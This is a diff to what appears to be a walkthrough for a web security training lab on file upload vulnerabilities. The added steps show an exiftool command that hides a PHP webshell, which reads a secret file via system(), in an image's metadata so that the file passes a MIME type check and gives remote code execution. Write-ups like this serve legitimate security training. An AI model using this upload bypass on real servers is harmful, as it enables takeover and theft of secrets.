@@ -112,5 +112,13 @@ You can log in to your own account using the following credentials: wiener:peter
 ```
 
 1. Upload webshell.php
+2. Try to bypass mime type check with :
+
+```bash
+exiftool -Comment="<?php echo 'start ' .  system('cat /home/carlos/secret') . ' END'; ?>" dices.png -o polyglot4.php
+```
+
+3. Upload polyglot4.php
+4. Enjoy RCE
 
 ---
